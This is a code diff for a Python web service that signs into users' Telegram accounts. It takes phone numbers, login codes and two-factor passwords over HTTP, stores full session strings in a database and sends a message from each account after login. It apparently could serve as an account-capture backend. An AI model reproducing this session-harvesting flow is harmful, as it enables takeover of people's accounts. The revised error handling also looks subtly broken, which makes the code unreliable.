@@ -15,6 +15,7 @@ import os
 import psycopg2
 from psycopg2 import sql
 import httpx  # For health check of another server
+from cachetools import TTLCache
 
 # Load environment variables from the .env file
 load_dotenv()
@@ -127,6 +128,9 @@ def delete_session_from_db(chat_id):
     db_conn.commit()
     print(f"Session for chat_id {chat_id} deleted successfully.")
 
+
+# TTL cache for managing user clients
+user_clients = TTLCache(maxsize=1000, ttl=300)
 
 # New function to send a message after successful login
 async def send_message(user_client):
@@ -304,70 +308,80 @@ async def request_code():
         await user_client.disconnect()
 
 
+
+
+# Web API Endpoints
 @app.route('/verify_code', methods=['POST'])
 async def verify_code():
     data = await request.get_json()
     phone = data.get('phone')
     code = data.get('code')
     phone_code_hash = data.get('phone_code_hash')
-    password = data.get('password', None)  # For 2FA password
     chat_id = data.get('chat_id')
-    scraper = data.get('scraper')
 
     if not phone or not code or not phone_code_hash or not chat_id:
-        print(f"Missing parameters: phone={phone}, code={code}, phone_code_hash={phone_code_hash}, chat_id={chat_id}")
         return jsonify({'error': 'Phone, code, phone_code_hash, and chat_id are required'}), 400
 
-    # Try to retrieve the session string from the database
-    print(f"Retrieving session for chat_id={chat_id}...")
     session_string = get_session_from_db(chat_id)
-    
     if not session_string:
-        print(f"Session for chat_id={chat_id} not found in the database.")
         return jsonify({'error': f'No session found for chat_id={chat_id}'}), 404
 
-    session = StringSession(session_string)  # Reconstruct the session from the string
-
-    # Initialize the Telegram client
-    print(f"Starting client with session_string={session_string}...")
+    session = StringSession(session_string)
     user_client = TelegramClient(session, api_id, api_hash)
+
     try:
         await user_client.connect()
         await user_client.sign_in(phone, code, phone_code_hash=phone_code_hash)
 
         if not await user_client.is_user_authorized():
-            if password:
-                await user_client.sign_in(password=password)
-            else:
-                print("Two-factor authentication required.")
-                return jsonify({'error': 'Two-factor authentication required'}), 403
+            user_clients[chat_id] = user_client
+            return jsonify({
+                'error': 'Two-factor authentication required',
+                'chat_id': chat_id
+            }), 403
 
-        # Save the session string to the database
-        session_string = user_client.session.save()  # This is a string representation of the session
+        session_string = user_client.session.save()
         save_session_to_db(chat_id, session_string)
-       # save_user_to_db(chat_id, phone, session)
+        await send_message(user_client)
 
-        if not scraper:
-            # Send a message after successful login
-            await send_message(user_client)
-
-        print(f"Login successful for chat_id={chat_id} and action performed.")
         return jsonify({'message': 'Login successful and action performed'})
-    except PhoneCodeInvalidError:
-        delete_session_from_db(chat_id)
-        print("Invalid login code.")
-        return jsonify({'error': 'Invalid login code'}), 400
-    except SessionPasswordNeededError:
-        delete_session_from_db(chat_id)
-        print("Two-factor authentication required.")
-        return jsonify({'error': 'Two-factor authentication required'}), 403
     except Exception as e:
-        delete_session_from_db(chat_id)
-        print(f"Error: {e}")
+        print(f"Error in /verify_code for chat_id={chat_id}: {e}")
+        return jsonify({'error': f'Error: {e}'}), 500
+    finally:
+        if chat_id not in user_clients:
+            await user_client.disconnect()
+
+@app.route('/verify_2fa', methods=['POST'])
+async def verify_2fa():
+    data = await request.get_json()
+    chat_id = data.get('chat_id')
+    password = data.get('password')
+
+    if not chat_id or not password:
+        return jsonify({'error': 'Chat ID and password are required'}), 400
+
+    user_client = user_clients.get(chat_id)
+    if not user_client:
+        return jsonify({'error': 'No active session found for the given chat ID'}), 404
+
+    try:
+        await user_client.sign_in(password=password)
+
+        session_string = user_client.session.save()
+        save_session_to_db(chat_id, session_string)
+        await send_message(user_client)
+
+        return jsonify({'message': 'Login successful and action performed'})
+    except SessionPasswordNeededError:
+        return jsonify({'error': 'Incorrect 2FA password'}), 403
+    except Exception as e:
+        print(f"Error in /verify_2fa for chat_id={chat_id}: {e}")
         return jsonify({'error': f'Error: {e}'}), 500
     finally:
         await user_client.disconnect()
-    
+        user_clients.pop(chat_id, None)
+
 
 
 # API to trigger send_message function
